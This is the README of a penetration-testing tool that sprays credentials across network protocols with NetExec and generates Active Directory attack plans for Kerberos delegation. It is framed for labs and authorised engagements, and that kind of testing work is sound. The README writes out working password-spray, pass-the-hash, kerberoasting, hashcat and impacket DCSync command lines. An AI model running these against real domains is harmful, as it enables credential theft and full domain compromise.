# tomsploit

Fast [NetExec](https://github.com/Pennyw0rth/NetExec) (`nxc`) triage across protocols and targets.

`tomsploit` sprays a credential set against every available protocol, confirms which logins are valid, and prints the **exact follow‑up commands** for each win — already filled in with the target, domain, username and credential. When a login works on a domain controller it runs a read‑only enrichment pass and writes a per‑account **Kerberos delegation walkthrough** to disk.

It is a careful `nxc` front‑end with a context‑aware command generator, **not** a one‑shot attack‑and‑loot engine.

```
$ tomsploit -t 10.129.205.35 -u carole.rose -p 'jasmine'
  ...
  ✔ SMB (domain)   INLANEFREIGHT.LOCAL\carole.rose:jasmine
  ✔ LDAP (domain)  INLANEFREIGHT.LOCAL\carole.rose:jasmine
  ⊕ enrich  delegation: 2x constrained_pt, 2x unconstrained; MAQ: 0; roastable: 7

  🔑 Delegation — 4 finding(s)
      callum.dixon   DCSync (capture DC TGT)      need: secret: AS-REP roastable now
      beth.richards  DCSync (delegates to the DC) need: secret: kerberoastable now
      DMZ01$         SYSTEM on WS01.INLANEFREIGHT.LOCAL
      SQL01$         DCSync (capture DC TGT)      need: SYSTEM on SQL01 or its hash

      full commands → tomsploit-delegation-10.129.205.35-carole.rose.txt
```

---

## Scope

**Enumeration only.** `tomsploit` finds and reports access — and flags relay‑able hosts, domain controllers, anonymous access, and credentials that are valid‑but‑unusable — but it does not exploit, dump, or loot. Every enrichment query reads the directory; nothing is modified. The tool hands you the commands to take the next step yourself.

This makes it well suited to lab/OSCP/OSEP‑style workflows and authorised engagements where you want a fast read on what a credential unlocks and a ready‑to‑run plan for each finding.

> Use only against systems you are authorised to test.

---

## Features

- **Multi‑protocol spray** across `smb, ssh, ldap, ftp, wmi, winrm, rdp, vnc, mssql, nfs` (VNC and NFS off by default), domain and local‑auth in one pass.
- **Flexible credentials:** password, NTLM hash (Pass‑the‑Hash), Kerberos ticket cache, or a `user:secret` combo file. Cross‑spray or positional pairing.
- **Context‑aware next commands** per valid login, with a one‑line outcome hint on each ("what a hit looks like and where it leads", not a description of the command).
- **Pre‑flight port probe** to skip protocols whose port is closed, and lockout‑aware spray accounting.
- **Relay / DC / anonymous‑access detection** surfaced as first‑class findings.
- **Automatic Kerberos delegation engine** (see below) — the headline feature.
- **Three verbosity levels** for the command output: `--bare` (commands only), default (commands + one‑line hints), `--notes` (full reasoning and caveats).
- **Paste‑ready script output** with `--sh`.
- **Single file, no install** — `scp tomsploit.py` onto a box and run it.

---

## The delegation engine

When an LDAP credential works on a DC, `tomsploit` runs a batch of read‑only queries and turns the results into an actionable, per‑account Kerberos‑delegation plan.

It enumerates delegation with `--find-delegation`, then resolves each finding with targeted queries so the routes are **decisions, not homework**:

- **Roastability** — for each delegating account, is it kerberoastable (`servicePrincipalName`) or AS‑REP‑roastable (`userAccountControl`) *right now*? The route emits the exact roast command instead of "kerberoast it if it has an SPN".
- **Disabled accounts** — a route on a disabled account is marked dead up front.
- **MachineAccountQuota** — resolves whether RBCD "add a computer" is even possible (`MAQ 0` → path dead).
- **`msDS-AllowedToDelegateTo`** — the full constrained‑delegation target list, so "this delegates to the DC" (→ DCSync via an `ldap/` sname swap) is detected authoritatively.
- **Direct‑ACE writers** (`daclread`, per account) — who can write the account's SPN / RBCD attribute, for the direct‑ACE case. Group‑inherited rights are invisible to this and the output says so, pointing you to BloodHound.

Each abusable delegation is written to `tomsploit-delegation-<ip>-<user>.txt` as a self‑contained route:

```
# ╭─────────────────────────────────────────────────────────────────────────╮
# │ [2/4]  CONSTRAINED + PROTOCOL TRANSITION on beth.richards →              │
# │        DC01.INLANEFREIGHT.LOCAL (the DC)                                 │
# ╰─────────────────────────────────────────────────────────────────────────╯
#
# GET     : DCSync — every hash in the domain (incl. krbtgt)
# REQUIRED: beth.richards's secret — nothing else
# MISSING : beth.richards's secret — kerberoast now (cmd below)
# WHY     : the allowed SPN is on the DC, so swapping the service class
#           TERMSRV/ → ldap/ on the same host yields a DCSync ticket
#
    # ── GET THE CRED: beth.richards holds an SPN — kerberoastable now:
    nxc ldap 10.129.205.35 -u carole.rose -p 'jasmine' \
      --kerberoasting beth.richards.roast --kerberoast-account beth.richards
    hashcat -m 13100 beth.richards.roast /usr/share/wordlists/rockyou.txt
    # dump every credential in the domain:
    impacket-getST -spn TERMSRV/DC01.INLANEFREIGHT.LOCAL -altservice ldap/DC01.INLANEFREIGHT.LOCAL \
      -impersonate administrator 'INLANEFREIGHT.LOCAL/beth.richards:<beth.richards-PASSWORD>' -dc-ip 10.129.205.35
    ...
```

Each route reads:

| Field | Meaning |
|-------|---------|
| **GET** | what you end up holding if the steps succeed |
| **REQUIRED** | the complete prerequisite list for the commands |
| **MISSING** | the subset of REQUIRED you don't hold yet, each with how to get it |
| **WHY** | the mechanism, where it isn't obvious from the commands |

Notes on the generated file:

- **Values are filled in.** DC name/FQDN, your account, chosen passwords — only genuinely unknown things (a secret you haven't cracked, a runtime ticket blob) stay as `<placeholders>`.
- **It's aware of the account you ran as.** If a route is *for* the account you authenticated with, it doesn't tell you to roast a password you already hold — it uses your real credential and marks the secret as held.
- **It's paste‑safe.** Drop the file into a shell and it runs only the fully‑resolved commands; anything with an unfilled `<placeholder>` is commented out. Every value pulled from Active Directory (account names, SPNs, ACL trustees) is sanitised, so a hostile object name can't inject a command.
- **The commands use the correct impacket syntax** — passwords go in the identity string (`domain/user:password`), because `getST`/`rbcd`/`addcomputer` have no `-p` flag.

Disable the whole pass with `--no-enrich`. Run the same engine offline on `findDelegation` output you already have with `--deleg-in` (see below).

---

## Requirements

- **Python 3.10+** (uses `X | None` type syntax).
- **[NetExec](https://github.com/Pennyw0rth/NetExec)** (`nxc`) on `PATH` — the scanning engine.
- Standard library only; no `pip install` for tomsploit itself.
- Optional, only for `-k` ticket conversion: `impacket-ticketConverter`.

The **generated commands** reference the usual AD toolkit (impacket, hashcat, certipy, BloodHound, krbrelayx, PetitPotam, Rubeus, …). You run those yourself; tomsploit doesn't require them to be installed to *emit* the commands.

---

## Install

```bash
git clone https://github.com/<you>/tomsploit.git
cd tomsploit
chmod +x tomsploit.py
./tomsploit.py --help
```

Or just copy the one file where you need it:

```bash
scp tomsploit.py kali@box:/tmp/ && ssh kali@box python3 /tmp/tomsploit.py -h
```

---

## Usage

```bash
# Password against one host
tomsploit -t 192.168.1.10 -u admin -p 'Password123'

# Spray a users list × passwords list across a /24
tomsploit -t 192.168.1.0/24 -u users.txt -p passwords.txt

# Pass-the-Hash
tomsploit -t target.htb -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Positional pairing: line N of users.txt only against line N of hashes.txt
tomsploit -t 192.168.1.10 -u users.txt -H hashes.txt --paired

# Combo file (user:secret per line; hashes auto-detected and used as PtH)
tomsploit -t 192.168.1.10 --combo creds.txt

# Kerberos ticket cache
tomsploit -t dc01.corp.local -u admin -k

# Restrict protocols
tomsploit -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp

# Paste-ready shell script (findings become comments; progress goes to stderr)
tomsploit -t 192.168.1.10 -u admin -p pw --sh > next.sh
```

### Delegation

```bash
# Automatic: a valid DC login triggers the enrichment pass and writes
# tomsploit-delegation-<ip>-<user>.txt with the routes.
tomsploit -t 10.10.10.5 -u carole -p pw

# Skip the extra queries
tomsploit -t 10.10.10.5 -u carole -p pw --no-enrich

# Offline: run the delegation engine on findDelegation output you already have.
# --dc-name enables the "delegates to the DC" (= domain compromise) detection.
nxc ldap 10.10.10.5 -u u -p p --find-delegation \
  | tomsploit --deleg-in - -t 10.10.10.5 -d corp1.com --dc-name DC01 -u u -p p
```

### Output verbosity

| Flag | Command output |
|------|----------------|
| `--bare` | commands only — nothing else |
| *(default)* | commands + a one‑line outcome hint on each |
| `--notes` | full reasoning, caveats, and commented‑out alternatives |
| `-q` / `--quiet` | just valid creds + suggested commands |
| `-v` / `--verbose` | every `nxc` line, including each failed login |
| `--sh` | flush‑left, uncoloured, paste‑ready shell script |

---

## Key options

```
-t, --target        IP, hostname, CIDR, or file of any of these
-u, --user          username or path to users file
-p, --password      password or path to passwords file
-H, --hash          NTLM hash (LM:NT or NT), or a file of hashes
-k, --kerberos      use a Kerberos ccache (optionally a ticket file path)
-d, --domain        AD domain for domain-scope auth
--paired            positional pairing instead of cross-spray
--combo FILE        user:secret combo file (implies pairing)
--protocols LIST    comma-separated subset of the supported protocols
--no-enrich         skip the post-scan LDAP delegation enrichment
--deleg-in FILE     run the delegation engine offline on findDelegation output
--dc-name NAME      DC short hostname, for the offline "delegates to DC" check
--deleg-out FILE    where to write the delegation file
--bare / --notes    less / more detail in the command output
--sh                emit a paste-ready shell script
-o, --output FILE   write a consolidated scan log
--json-output FILE  write structured results as JSON
--creds-file FILE   append valid credentials to a TSV
```

Run `tomsploit --help` for the complete list.

---

## Safety & correctness notes

- **Read‑only by design.** The enrichment pass and every generated‑file value come from directory reads; tomsploit itself performs no writes.
- **Generated files hold live credentials.** The delegation file prints the credential it ran with (it's already in the runnable commands), so treat `tomsploit-delegation-*.txt` as sensitive.
- **Parsing is verified against tool source** (NetExec, impacket) and hardened against malformed, partial, and adversarial output — but the parsers should be sanity‑checked against a real DC's live output on first use in a new environment; `--no-enrich` restores plain behaviour if anything looks off.
- **A louder footprint with enrichment on** — a DC login fires roughly a dozen `nxc` queries. Use `--no-enrich` on a monitored engagement if that matters.

---

## License

MIT. See the license block at the end of `tomsploit.py`.
